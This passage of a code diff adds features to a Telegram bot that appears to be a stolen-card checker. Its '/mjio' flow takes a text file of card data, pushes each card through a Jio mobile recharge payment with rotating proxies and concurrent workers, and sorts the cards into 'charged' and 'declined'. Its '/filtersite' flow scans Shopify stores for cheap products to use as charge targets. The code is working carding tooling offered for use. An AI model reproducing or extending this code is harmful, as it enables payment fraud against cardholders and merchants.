+            "[⌯] 𝗙𝗹𝗼𝘄 ⌁ 𝗡𝘂𝗺𝗯𝗲𝗿 → 𝗔𝗺𝗼𝘂𝗻𝘁 → 𝗦𝘁𝗮𝗿𝘁"
+        ), parse_mode='html')
+        return
+
+    reply = await event.get_reply_message()
+    if not reply.file or not (reply.file.name or '').endswith('.txt'):
+        await event.reply(pe("❌ 𝗥𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲"), parse_mode='html')
+        return
+
+    import tempfile, uuid as _u
+    td = os.path.join(tempfile.gettempdir(), "rxo_uploads")
+    os.makedirs(td, exist_ok=True)
+    fp = os.path.join(td, f"{_u.uuid4().hex}.txt")
+    fp = await reply.download_media(file=fp)
+    try:
+        async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
+            content = await f.read()
+    finally:
+        try: os.remove(fp)
+        except: pass
+
+    cards = extract_cc(content)
+    if not cards:
+        await event.reply(pe("❌ 𝗡𝗼 𝘃𝗮𝗹𝗶𝗱 𝗰𝗮𝗿𝗱𝘀"), parse_mode='html')
+        return
+
+    file_name = reply.file.name or "cards.txt"
+    limit = get_user_limit(uid)
+    if len(cards) > limit:
+        cards = cards[:limit]
+
+    _JIO_MS_STATE[uid] = {
+        'step': 'number',
+        'cards': cards,
+        'file_name': file_name,
+        'number': None,
+    }
+
+    await event.reply(pe(
+        "[⌯] 𝗠𝗮𝘀𝘀 𝗝𝗶𝗼 ⌁ 𝗦𝘁𝗲𝗽 𝟭/𝟮 ⌁ 📱\n"
+        "─────────────────────\n"
+        f"[⌯] 𝗖𝗮𝗿𝗱𝘀 ⌁ {len(cards):,} 💳\n"
+        f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ {file_name}\n"
+        "─────────────────────\n"
+        "[⌯] 𝗡𝗼𝘄 𝘀𝗲𝗻𝗱 𝗝𝗶𝗼 𝗻𝘂𝗺𝗯𝗲𝗿 📞\n"
+        "[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁ 9226217275\n"
+        "─────────────────────\n"
+        "[⌯] 𝗖𝗮𝗻𝗰𝗲𝗹 ⌁ /canceljio"
+    ), parse_mode='html')
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ SINGLE state-machine handler — FIXES double trigger bug
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(func=lambda e: e.sender_id in _JIO_MS_STATE))
+async def _jio_ms_state_handler(event):
+    uid = event.sender_id
+    if not event.text:
+        return
+    # ═══ Skip commands / files / bots ═══
+    if event.text.startswith('/'):
+        return
+    if event.via_bot_id or event.file:
+        return
+
+    st = _JIO_MS_STATE.get(uid)
+    if not st:
+        return
+    step = st.get('step')
+
+    # ═══ STEP 1: AWAITING NUMBER ═══
+    if step == 'number':
+        txt = event.text.strip()
+        if not txt.isdigit() or len(txt) < 10 or len(txt) > 12:
+            await event.reply(pe(
+                "[⌯] ❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿\n"
+                "─────────────────────\n"
+                "[⌯] 𝗦𝗲𝗻𝗱 𝟭𝟬-𝟭𝟮 𝗱𝗶𝗴𝗶𝘁 𝗻𝘂𝗺𝗯𝗲𝗿\n"
+                "[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁ 9226217275"
+            ), parse_mode='html')
+            return
+
+        # ═══ IMMEDIATE state change (before any await) ═══
+        st['number'] = txt
+        st['step'] = 'amount'
+
+        await event.reply(pe(
+            "[⌯] 𝗠𝗮𝘀𝘀 𝗝𝗶𝗼 ⌁ 𝗦𝘁𝗲𝗽 𝟮/𝟮 ⌁ 💰\n"
+            "─────────────────────\n"
+            f"[⌯] 𝗡𝘂𝗺𝗯𝗲𝗿 ⌁ <code>{txt}</code> 📞\n"
+            f"[⌯] 𝗖𝗮𝗿𝗱𝘀 ⌁ {len(st['cards']):,} 💳\n"
+            "─────────────────────\n"
+            "[⌯] 𝗡𝗼𝘄 𝘀𝗲𝗻𝗱 𝗮𝗺𝗼𝘂𝗻𝘁 💰\n"
+            "[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁ 19\n"
+            "─────────────────────\n"
+            "[⌯] 𝗖𝗮𝗻𝗰𝗲𝗹 ⌁ /canceljio"
+        ), parse_mode='html')
+        return
+
+    # ═══ STEP 2: AWAITING AMOUNT ═══
+    if step == 'amount':
+        txt = event.text.strip()
+
+        # ═══ CRITICAL: 10-digit number ko amount na samjho ═══
+        if txt.isdigit() and len(txt) in (10, 11, 12):
+            await event.reply(pe(
+                "[⌯] ⚠️ 𝗬𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝗹𝗮𝗴 𝗿𝗮𝗵𝗮 𝗵𝗮𝗶\n"
+                "─────────────────────\n"
+                "[⌯] 𝗔𝗯 𝗮𝗺𝗼𝘂𝗻𝘁 𝗯𝗵𝗲𝗷𝗼\n"
+                "[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁ 19"
+            ), parse_mode='html')
+            return
+
+        try:
+            amount = float(txt)
+            if amount <= 0 or amount > 10000:
+                raise ValueError()
+        except Exception:
+            await event.reply(pe(
+                "[⌯] ❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗮𝗺𝗼𝘂𝗻𝘁\n"
+                "─────────────────────\n"
+                "[⌯] 𝗦𝗲𝗻𝗱 𝗻𝘂𝗺𝗯𝗲𝗿 𝟭-𝟭𝟬𝟬𝟬𝟬\n"
+                "[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁ 19"
+            ), parse_mode='html')
+            return
+
+        # ═══ Pop state BEFORE any await ═══
+        st = _JIO_MS_STATE.pop(uid, None)
+        if not st:
+            return
+
+        number = st['number']
+        cards = st['cards']
+        file_name = st['file_name']
+        amount_str = str(int(amount)) if amount == int(amount) else str(amount)
+
+        asyncio.create_task(_jio_ms_start(uid, number, amount_str, cards, file_name))
+        return
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ /canceljio
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/canceljio$'))
+async def jio_cancel(event):
+    uid = event.sender_id
+    if uid in _JIO_MS_STATE:
+        _JIO_MS_STATE.pop(uid, None)
+        await event.reply(pe(
+            "[⌯] ❌ 𝗝𝗶𝗼 𝗠𝗮𝘀𝘀 ⌁ 𝗖𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱\n"
+            "─────────────────────"
+        ), parse_mode='html')
+        return
+    st = _JIO_MS_ACTIVE.get(uid)
+    if st and not st.get('stop'):
+        st['stop'] = True
+        await event.reply(pe("[⌯] ⛔ 𝗦𝘁𝗼𝗽𝗽𝗶𝗻𝗴..."), parse_mode='html')
+    else:
+        await event.reply(pe("[⌯] ⚠️ 𝗡𝗼 𝗮𝗰𝘁𝗶𝘃𝗲 𝘀𝗲𝘀𝘀𝗶𝗼𝗻"), parse_mode='html')
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ Engine start
+# ══════════════════════════════════════════════════════════════════════════════
+async def _jio_ms_start(uid, number, amount, cards, file_name):
+    proxies = get_proxies_for_user(uid) or load_proxies()
+    if not proxies:
+        await bot.send_message(uid, pe("❌ 𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀. /setproxy ip:port"), parse_mode='html')
+        return
+
+    text = pe(
+        "[⌯] 𝗠𝗮𝘀𝘀 𝗝𝗶𝗼 ⌁ 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 ⌁ 🔥\n"
+        "─────────────────────\n"
+        f"[⌯] 𝗡𝘂𝗺𝗯𝗲𝗿 ⌁ <code>{number}</code> 📞\n"
+        f"[⌯] 𝗔𝗺𝗼𝘂𝗻𝘁 ⌁ <code>{amount}</code> 💰\n"
+        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(cards):,} 💳\n"
+        "─────────────────────\n"
+        "[⌯] 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ⌁ 0 💎\n"
+        "[⌯] 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ⌁ 0 🚫\n"
+        "[⌯] 𝗘𝗿𝗿𝗼𝗿 ⌁ 0 ❌\n"
+        f"[⌯] 𝗪𝗼𝗿𝗸𝗲𝗿𝘀 ⌁ {_JIO_MS_WORKERS} ⚙️\n"
+        "─────────────────────\n"
+        "●○○○○○○○○○○○○○○○○○○○ 0%\n"
+        f"0 / {len(cards):,}\n"
+        "─────────────────────\n"
+        "⏳ 𝗪𝗮𝗶𝘁𝗶𝗻𝗴..."
+    )
+    msg_id = await raw_send(uid, text, rows_stop())
+    if not msg_id:
+        return
+
+    _JIO_MS_ACTIVE[uid] = {
+        'msg_id': msg_id,
+        'stop': False,
+        'paused': False,
+        'started_at': time.time(),
+        'charged': 0, 'declined': 0, 'error': 0,
+        'charged_list': [], 'declined_list': [], 'error_list': [],
+        'number': number, 'amount': amount,
+        'total': len(cards), 'done': 0,
+        'file_name': file_name,
+    }
+    asyncio.create_task(_jio_ms_worker(uid, cards, proxies))
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ Engine worker
+# ══════════════════════════════════════════════════════════════════════════════
+async def _jio_ms_worker(uid, cards, proxies):
+    st = _JIO_MS_ACTIVE.get(uid)
+    if not st:
+        return
+
+    sem = asyncio.Semaphore(_JIO_MS_WORKERS)
+    lock = asyncio.Lock()
+    last_edit = [0.0]
+
+    async def one(card):
+        async with sem:
+            if st.get('stop'):
+                return
+            while st.get('paused') and not st.get('stop'):
+                await asyncio.sleep(1)
+            if st.get('stop'):
+                return
+
+            proxy_param = _jio_ms_pick_proxy(proxies)
+            ok, data, elapsed = await _jio_ms_hit(
+                st['number'], st['amount'], card, proxy_param
+            )
+            hit_type, status_display, result_text = _jio_ms_classify(data if ok else {})
+
+            async with lock:
+                st['done'] += 1
+                if hit_type == "Charged":
+                    st['charged'] += 1
+                    st['charged_list'].append({'card': card, 'msg': result_text, 'time': elapsed})
+                elif status_display == "DECLINED":
+                    st['declined'] += 1
+                    st['declined_list'].append({'card': card, 'msg': result_text, 'time': elapsed})
+                else:
+                    st['error'] += 1
+                    st['error_list'].append({'card': card, 'msg': result_text, 'time': elapsed})
+
+            if hit_type == "Charged":
+                try:
+                    bin_info = await get_bin_info(card.split('|')[0])
+                except Exception:
+                    bin_info = None
+                try:
+                    await send_realtime_hit(uid, {
+                        'card': card, 'status': 'Charged', 'message': result_text,
+                        'gateway': 'Jio Recharge', 'price': st['amount'],
+                        'time': elapsed, 'bin_info': bin_info,
+                    }, 'Charged', st['file_name'])
+                except Exception as e:
+                    print(f"[JIO hit] {e}")
+
+            now = time.time()
+            if now - last_edit[0] >= 3:
+                last_edit[0] = now
+                try:
+                    await _jio_ms_update_ui(uid, st)
+                except Exception as e:
+                    print(f"[JIO progress] {e}")
+
+    try:
+        tasks = [asyncio.create_task(one(c)) for c in cards]
+        await asyncio.gather(*tasks, return_exceptions=True)
+    finally:
+        _JIO_MS_ACTIVE.pop(uid, None)
+        await _jio_ms_final(uid, st)
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ Progress UI
+# ══════════════════════════════════════════════════════════════════════════════
+async def _jio_ms_update_ui(uid, st):
+    total = st['total']
+    done = st['done']
+    pct = int(100 * done / total) if total else 0
+    filled = int(20 * done / total) if total else 0
+    bar = '●' * filled + '○' * (20 - filled)
+
+    text = pe(
+        "[⌯] 𝗠𝗮𝘀𝘀 𝗝𝗶𝗼 ⌁ 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 ⌁ 🔥\n"
+        "─────────────────────\n"
+        f"[⌯] 𝗡𝘂𝗺𝗯𝗲𝗿 ⌁ <code>{st['number']}</code> 📞\n"
+        f"[⌯] 𝗔𝗺𝗼𝘂𝗻𝘁 ⌁ <code>{st['amount']}</code> 💰\n"
+        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {total:,} 💳\n"
+        "─────────────────────\n"
+        f"[⌯] 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ⌁ {st['charged']} 💎\n"
+        f"[⌯] 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ⌁ {st['declined']} 🚫\n"
+        f"[⌯] 𝗘𝗿𝗿𝗼𝗿 ⌁ {st['error']} ❌\n"
+        f"[⌯] 𝗪𝗼𝗿𝗸𝗲𝗿𝘀 ⌁ {_JIO_MS_WORKERS} ⚙️\n"
+        "─────────────────────\n"
+        f"{bar} {pct}%\n"
+        f"{done:,} / {total:,}\n"
+        "─────────────────────\n"
+        "⚡ 𝗥𝘂𝗻𝗻𝗶𝗻𝗴..."
+    )
+    try:
+        await raw_edit(uid, st['msg_id'], text, rows_stop())
+    except Exception:
+        pass
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ Final summary + result files
+# ══════════════════════════════════════════════════════════════════════════════
+async def _jio_ms_final(uid, st):
+    elapsed = int(time.time() - st['started_at'])
+    m, s = elapsed // 60, elapsed % 60
+    total = st['total']
+    done = st['done']
+    pct = int(100 * done / total) if total else 0
+    filled = int(20 * done / total) if total else 0
+    bar = '●' * filled + '○' * (20 - filled)
+
+    try:
+        cname = await get_display_name(uid)
+    except Exception:
+        cname = str(uid)
+
+    summary = pe(
+        "[⌯] 𝗠𝗮𝘀𝘀 𝗝𝗶𝗼 ⌁ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲 ⌁ ✅\n"
+        "─────────────────────\n"
+        f"[⌯] 𝗡𝘂𝗺𝗯𝗲𝗿 ⌁ <code>{st['number']}</code> 📞\n"
+        f"[⌯] 𝗔𝗺𝗼𝘂𝗻𝘁 ⌁ <code>{st['amount']}</code> 💰\n"
+        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {total:,} 💳\n"
+        f"[⌯] 𝗗𝗼𝗻𝗲 ⌁ {done:,} ⚙️\n"
+        "─────────────────────\n"
+        f"[⌯] 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ⌁ {st['charged']} 💎\n"
+        f"[⌯] 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ⌁ {st['declined']} 🚫\n"
+        f"[⌯] 𝗘𝗿𝗿𝗼𝗿 ⌁ {st['error']} ❌\n"
+        "─────────────────────\n"
+        f"{bar} {pct}%\n"
+        f"{done:,} / {total:,}\n"
+        "─────────────────────\n"
+        f"[⌯] 𝗧𝗶𝗺𝗲 ⌁ {m}m {s}s ⏱️\n"
+        "─────────────────────\n"
+        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ 🔰 {cname}"
+    )
+    try:
+        await bot.send_message(uid, summary, parse_mode='html')
+    except Exception:
+        pass
+
+    for label, arr, emoji in [
+        ('CHARGED', st['charged_list'], '💎'),
+        ('DECLINED', st['declined_list'], '🚫'),
+        ('ERROR', st['error_list'], '❌'),
+    ]:
+        if not arr:
+            continue
+        fn = f"jio_{label.lower()}_{int(time.time())}.txt"
+        async with aiofiles.open(fn, 'w') as f:
+            for r in arr:
+                await f.write(f"{r['card']} | {r['msg']} | {r['time']}s\n")
+        try:
+            await bot.send_file(uid, fn,
+                                caption=pe(f"[⌯] {label} ⌁ {len(arr)} {emoji}"),
+                                parse_mode='html')
+        except Exception as e:
+            print(f"[JIO file] {e}")
+        try:
+            os.remove(fn)
+        except Exception:
+            pass
+
+
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ /mjio — entry (reply to .txt)
+# ══════════════════════════════════════════════════════════════════════════════
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ Step 1: number
+# ══════════════════════════════════════════════════════════════════════════════
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ Engine start — beautiful initial UI
+# ══════════════════════════════════════════════════════════════════════════════
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ Engine worker
+# ══════════════════════════════════════════════════════════════════════════════
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ Progress UI
+# ══════════════════════════════════════════════════════════════════════════════
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ Final summary + result files
+# ══════════════════════════════════════════════════════════════════════════════
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ FILTERSITE STATE
+# ══════════════════════════════════════════════════════════════════════════════
+_filtersite_state: dict = {}   # uid → {step, source, max_price, custom_sites, task}
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/filtersite$'))
+async def filtersite_cmd(event):
+    uid = event.sender_id
+    if not is_admin(uid):
+        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝\n{SEP}\n❌ Admin only!"), parse_mode='html')
+        return
+
+    _filtersite_state[uid] = {'step': 'source'}
+
+    text = pe(
+        f"[⌯] 𝗙𝗶𝗹𝘁𝗲𝗿 𝗦𝗶𝘁𝗲 ⌁ 𝗦𝗲𝘁𝘂𝗽 ⌁ 🔍\n"
+        f"\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗦𝘁𝗲𝗽 𝟭 ⌁ 𝗖𝗵𝗼𝗼𝘀𝗲 𝘀𝗼𝘂𝗿𝗰𝗲 ⌁ 📂\n"
+        f"[⌯] 𝗣𝗼𝗼𝗹 ⌁ {len(load_sites())} 𝘀𝗶𝘁𝗲𝘀 ⌁ 🌐\n"
+        f"[⌯] 𝗖𝘂𝘀𝘁𝗼𝗺 ⌁ 𝘂𝗽𝗹𝗼𝗮𝗱 .𝘁𝘅𝘁 ⌁ 📁"
+    )
+    buttons = [
+        [{"text": "🌐 Pool Sites", "callback_data": "filtersite_pool", "style": "primary"}],
+        [{"text": "📁 Custom Sites", "callback_data": "filtersite_custom", "style": "primary"}],
+        [{"text": "❌ Cancel", "callback_data": "filtersite_cancel", "style": "danger"}]
+    ]
+    await raw_send(uid, text, buttons)
+
+
+@bot.on(events.CallbackQuery(pattern=b"^filtersite_pool$"))
+async def filtersite_pool_cb(event):
+    uid = event.sender_id
+    if not is_admin(uid):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer()
+    _filtersite_state[uid] = {'step': 'maxprice', 'source': 'pool'}
+    await _filtersite_ask_price(uid, event.chat_id, event.message_id)
+
+
+@bot.on(events.CallbackQuery(pattern=b"^filtersite_custom$"))
+async def filtersite_custom_cb(event):
+    uid = event.sender_id
+    if not is_admin(uid):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer()
+    _filtersite_state[uid] = {'step': 'upload', 'source': 'custom'}
+    text = pe(
+        f"[⌯] 𝗖𝘂𝘀𝘁𝗼𝗺 𝗦𝗶𝘁𝗲𝘀 ⌁ 📁\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗨𝗽𝗹𝗼𝗮𝗱 .𝘁𝘅𝘁 ⌁ 𝗼𝗻𝗲 𝘀𝗶𝘁𝗲 𝗽𝗲𝗿 𝗹𝗶𝗻𝗲 ⌁ ⚡\n"
+        f"[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁ https://shop.myshopify.com ⌁ 🌐"
+    )
+    buttons = [[{"text": "❌ Cancel", "callback_data": "filtersite_cancel", "style": "danger"}]]
+    await raw_edit(uid, event.message_id, text, buttons)
+
+
+@bot.on(events.CallbackQuery(pattern=b"^filtersite_cancel$"))
+async def filtersite_cancel_cb(event):
+    uid = event.sender_id
+    _filtersite_state.pop(uid, None)
+    await event.answer("❌ Cancelled", alert=True)
+    try:
+        await raw_edit(uid, event.message_id, pe(f"❌ 𝗙𝗶𝗹𝘁𝗲𝗿 𝗦𝗶𝘁𝗲 ⌁ 𝗖𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱"), [])
+    except Exception:
+        pass
+
+
+async def _filtersite_ask_price(uid, chat_id, msg_id):
+    text = pe(
+        f"[⌯] 𝗙𝗶𝗹𝘁𝗲𝗿 𝗦𝗶𝘁𝗲 ⌁ 𝗦𝘁𝗲𝗽 𝟮 ⌁ 💰\n"
+        f"\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗘𝗻𝘁𝗲𝗿 𝗺𝗮𝘅 𝗽𝗿𝗶𝗰𝗲 ⌁ $\n"
+        f"[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁ 10 (for $10) ⌁ ⚡\n"
+        f"[⌯] 𝗢𝗿 ⌁ /cancel to abort ⌁ ❌"
+    )
+    buttons = [[{"text": "❌ Cancel", "callback_data": "filtersite_cancel", "style": "danger"}]]
+    try:
+        await raw_edit(uid, msg_id, text, buttons)
+    except Exception:
+        await raw_send(uid, text, buttons)
+
+
+@bot.on(events.NewMessage(func=lambda e: e.sender_id in _filtersite_state and _filtersite_state[e.sender_id].get('step') == 'maxprice'))
+async def filtersite_price_input(event):
+    uid = event.sender_id
+    if not is_admin(uid):
+        return
+    if not event.text:
+        return
+    txt = event.text.strip().lstrip('/').strip()
+    if txt.lower() == 'cancel':
+        _filtersite_state.pop(uid, None)
+        await event.reply(pe(f"❌ 𝗖𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱"))
+        return
+    try:
+        max_price = float(txt.replace('$', '').strip())
+        if max_price <= 0 or max_price > 10000:
+            raise ValueError()
+    except Exception:
+        await event.reply(pe(f"❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗮𝗺𝗼𝘂𝗻𝘁 ⌁ 𝘀𝗲𝗻𝗱 𝗻𝘂𝗺𝗯𝗲𝗿 (1-10000)"))
+        return
+
+    state = _filtersite_state.get(uid, {})
+    state['max_price'] = max_price
+    state['step'] = 'running'
+
+    sites = load_sites()
+    await event.reply(pe(
+        f"[⌯] 𝗙𝗶𝗹𝘁𝗲𝗿 𝗦𝗶𝘁𝗲 ⌁ 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 ⌁ 🔍\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(sites):,} 𝘀𝗶𝘁𝗲𝘀 ⌁ 🌐\n"
+        f"[⌯] 𝗠𝗮𝘅 𝗣𝗿𝗶𝗰𝗲 ⌁ ${max_price} ⌁ 💰\n"
+        f"{SEP}\n"
+        f"⏳ 𝗦𝗰𝗮𝗻𝗻𝗶𝗻𝗴..."
+    ), parse_mode='html')
+
+    asyncio.create_task(_run_filtersite(uid, sites, max_price))
+
+
+@bot.on(events.NewMessage(func=lambda e: e.sender_id in _filtersite_state and _filtersite_state[e.sender_id].get('step') == 'upload'))
+async def filtersite_upload_handler(event):
+    uid = event.sender_id
+    if not is_admin(uid):
+        return
+    if not event.file or not (event.file.name or '').endswith('.txt'):
+        return
+
+    # Download to /tmp
+    import tempfile, uuid as _u
+    tmp_dir = os.path.join(tempfile.gettempdir(), "rxo_uploads")
+    os.makedirs(tmp_dir, exist_ok=True)
+    fp = os.path.join(tmp_dir, f"{_u.uuid4().hex}.txt")
+    fp = await event.message.download_media(file=fp)
+    try:
+        async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
+            content = await f.read()
+    finally:
+        try: os.remove(fp)
+        except Exception: pass
+
+    sites = []
+    for line in content.splitlines():
+        line = line.strip()
+        if not line or line.startswith('#'):
+            continue
+        if not line.startswith('http'):
+            line = 'https://' + line
+        sites.append(line)
+
+    if not sites:
+        await event.reply(pe(f"❌ 𝗡𝗼 𝘀𝗶𝘁𝗲𝘀 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝗳𝗶𝗹𝗲"))
+        return
+
+    _filtersite_state[uid]['sites'] = sites
+    _filtersite_state[uid]['step'] = 'maxprice'
+
+    await event.reply(pe(
+        f"[⌯] 𝗖𝘂𝘀𝘁𝗼𝗺 𝗦𝗶𝘁𝗲𝘀 ⌁ 𝗟𝗼𝗮𝗱𝗲𝗱 ⌁ ✅\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗦𝗶𝘁𝗲𝘀 ⌁ {len(sites):,} ⌁ 🌐\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗡𝗼𝘄 𝗲𝗻𝘁𝗲𝗿 𝗺𝗮𝘅 𝗽𝗿𝗶𝗰𝗲 ⌁ 💰"
+    ), parse_mode='html')
+
+
+async def _scan_site_for_max_price(site_url, max_price, proxies):
+    """Scan a single site — check if ALL products are <= max_price."""
+    import aiohttp as _aio
+    try:
+        proxy = random.choice(proxies) if proxies else None
+        # Build proxy URL
+        proxy_url = None
+        if proxy:
+            p = proxy.strip()
+            if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
+                proxy_url = p
+            elif '@' in p:
+                proxy_url = f'http://{p}'
+            else:
+                parts = p.split(':')
+                if len(parts) >= 4:
+                    from urllib.parse import quote
+                    proxy_url = f'http://{quote(parts[2], safe="")}:{quote(":".join(parts[3:]), safe="")}@{parts[0]}:{parts[1]}'
+                elif len(parts) == 2:
+                    proxy_url = f'http://{p}'
+
+        site = site_url if site_url.startswith('http') else f'https://{site_url}'
+        site = site.rstrip('/')
+
+        url = f"{site}/products.json?limit=250"
+        timeout = _aio.ClientTimeout(total=20)
+        conn = _aio.TCPConnector(ssl=False, force_close=True, limit=10)
+
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Accept": "application/json",
+            "Accept-Language": "en-US,en;q=0.9",
+        }
+
+        async with _aio.ClientSession(connector=conn, timeout=timeout) as session:
+            async with session.get(url, headers=headers, proxy=proxy_url, allow_redirects=True) as r:
+                if r.status != 200:
+                    return {'site': site, 'ok': False, 'reason': f'HTTP {r.status}'}
+                try:
+                    data = json.loads(await r.text())
+                except Exception:
+                    return {'site': site, 'ok': False, 'reason': 'Bad JSON'}
+
+                products = data.get('products', [])
+                if not products:
+                    return {'site': site, 'ok': False, 'reason': 'No products'}
+
+                prices = []
+                min_price = None
+                max_price_seen = 0.0
+                for p in products:
+                    for v in p.get('variants', []):
+                        try:
+                            pr = float(str(v.get('price', '0')).replace(',', ''))
+                            if pr > 0:
+                                prices.append(pr)
+                                if min_price is None or pr < min_price:
+                                    min_price = pr
+                                if pr > max_price_seen:
+                                    max_price_seen = pr
+                        except Exception:
+                            pass
+
+                if not prices:
+                    return {'site': site, 'ok': False, 'reason': 'No prices'}
+
+                # Check if ALL prices <= max_price
+                if max_price_seen <= max_price:
+                    return {
+                        'site': site,
+                        'ok': True,
+                        'min_price': round(min_price, 2),
+                        'max_price': round(max_price_seen, 2),
+                        'products': len(products),
+                    }
+                else:
+                    return {
+                        'site': site,
+                        'ok': False,
+                        'reason': f'Expensive (max ${max_price_seen:.2f})'
+                    }
+    except asyncio.TimeoutError:
+        return {'site': site_url, 'ok': False, 'reason': 'Timeout'}
+    except Exception as e:
+        return {'site': site_url, 'ok': False, 'reason': str(e)[:40]}
+
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ /filtersite — Pool Add Confirmation Handlers
+# ══════════════════════════════════════════════════════════════════════════════
+
+@bot.on(events.CallbackQuery(pattern=b"^filtersite_add_yes$"))
+async def filtersite_add_yes_cb(event):
+    uid = event.sender_id
+    if not is_admin(uid):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer("✅ Adding...", alert=False)
+
+    state = _filtersite_state.get(uid, {})
+    matched = state.get('matched_sites', [])
+    if not matched:
+        try:
+            await raw_edit(uid, event.message_id, pe(
+                f"⚠️ 𝗡𝗼 𝘀𝗶𝘁𝗲𝘀 𝘁𝗼 𝗮𝗱𝗱"
+            ), [])
+        except Exception:
+            pass
+        return
+
+    # Load existing sites
+    existing = set(load_sites())
+    added = []
+    for m in matched:
+        s = m.get('site', '').rstrip('/')
+        if s and s not in existing:
+            added.append(s)
+
+    # Append to sites.txt
+    if added:
+        async with aiofiles.open(SITES_FILE, 'a') as f:
+            for s in added:
+                await f.write(f"{s}\n")
+
+    # Success message
+    text = pe(
+        f"[⌯] 𝗦𝗶𝘁𝗲𝘀 ⌁ 𝗔𝗱𝗱𝗲𝗱 ⌁ ✅\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗠𝗮𝘁𝗰𝗵𝗲𝗱 ⌁ {len(matched)} ⌁ 🔍\n"
+        f"[⌯] 𝗔𝗱𝗱𝗲𝗱 ⌁ {len(added)} ⌁ ➕\n"
+        f"[⌯] 𝗗𝘂𝗽𝗹𝗶𝗰𝗮𝘁𝗲𝘀 ⌁ {len(matched) - len(added)} ⌁ ⏭️\n"
+        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 𝗣𝗼𝗼𝗹 ⌁ {len(existing) + len(added)} ⌁ 🌐"
+    )
+    try:
+        await raw_edit(uid, event.message_id, text, [])
+    except Exception:
+        pass
+
+    _filtersite_state.pop(uid, None)
+
+
+@bot.on(events.CallbackQuery(pattern=b"^filtersite_add_no$"))
+async def filtersite_add_no_cb(event):
+    uid = event.sender_id
+    if not is_admin(uid):
+        await event.answer("❌ Admin only!", alert=True)
+        return
+    await event.answer("✅ Skipped", alert=False)
+
+    state = _filtersite_state.get(uid, {})
+    matched = state.get('matched_sites', [])
+
+    text = pe(
+        f"[⌯] 𝗦𝗶𝘁𝗲𝘀 ⌁ 𝗡𝗼𝘁 𝗔𝗱𝗱𝗲𝗱 ⌁ ❌\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗠𝗮𝘁𝗰𝗵𝗲𝗱 ⌁ {len(matched)} ⌁ 🔍\n"
